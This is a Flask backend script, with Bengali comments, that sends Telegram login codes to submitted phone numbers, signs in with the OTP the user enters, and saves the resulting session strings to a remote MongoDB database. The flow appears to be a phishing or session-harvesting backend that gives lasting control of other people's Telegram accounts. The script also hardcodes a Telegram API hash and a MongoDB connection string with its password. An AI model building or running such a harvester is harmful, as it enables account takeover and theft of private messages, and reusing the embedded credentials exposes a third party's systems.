# main.py এর একদম ওপরে এই লাইনটি যোগ করুন
import asyncio
from flask import Flask, request, jsonify
# বাকি ইম্পোর্টগুলো আগের মতোই থাকবে...
import os
import asyncio
from flask import Flask, request, jsonify
from flask_cors import CORS
from telethon import TelegramClient, errors
from pymongo import MongoClient

app = Flask(__name__)
CORS(app)

# আপনার কনফিগারেশন
API_ID = 34278231
API_HASH = '49cf7ab41e479d21a93c150a77c0cf85'
MONGO_URI = "mongodb+srv://jakaria5002a:jakaria5002a@cluster0.j2rvdkb.mongodb.net/"

# ডাটাবেজ কানেকশন
db_client = MongoClient(MONGO_URI)
db = db_client['telegram_data']
collection = db['sessions']

# লগইন প্রসেস ট্র্যাকিং করার জন্য ডিকশনারি
user_sessions = {}

@app.route('/')
def home():
    return "Backend is Running!"

@app.route('/login', methods=['POST'])
async def login():
    data = request.json
    phone = data.get('phone')
    
    if not phone:
        return jsonify({"status": "error", "message": "Phone number required"}), 400

    client = TelegramClient(f"sessions/{phone}", API_ID, API_HASH)
    await client.connect()
    
    try:
        # ওটিপি পাঠানোর রিকোয়েস্ট
        send_code = await client.send_code_request(phone)
        user_sessions[phone] = {
            "client": client,
            "hash": send_code.phone_code_hash
        }
        return jsonify({"status": "success", "message": "OTP Sent!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})

@app.route('/verify', methods=['POST'])
async def verify():
    data = request.json
    phone = data.get('phone')
    otp = data.get('otp')
    
    session_data = user_sessions.get(phone)
    if not session_data:
        return jsonify({"status": "error", "message": "Session not found. Restart login."}), 400
    
    client = session_data['client']
    phone_code_hash = session_data['hash']
    
    try:
        # ওটিপি ভেরিফাই করে লগইন করা
        await client.sign_in(phone, otp, phone_code_hash=phone_code_hash)
        
        # সেশন স্ট্রিং (কুকিজ) জেনারেট করা
        from telethon.sessions import StringSession
        string_session = StringSession.save(client.session)
        
        # ডাটাবেজে সেভ করা
        collection.insert_one({
            "phone": phone,
            "session_string": string_session
        })
        
        return jsonify({"status": "success", "message": "Login Successful!"})
        
    except errors.PhoneCodeInvalidError:
        return jsonify({"status": "error", "message": "Invalid OTP!"})
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)})


# main.py এর একদম শেষে app.run এর জায়গায় এটি দিন
if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    # সরাসরি app.run এর বদলে async সাপোর্ট নিশ্চিত করতে
    app.run(host='0.0.0.0', port=port, debug=False)

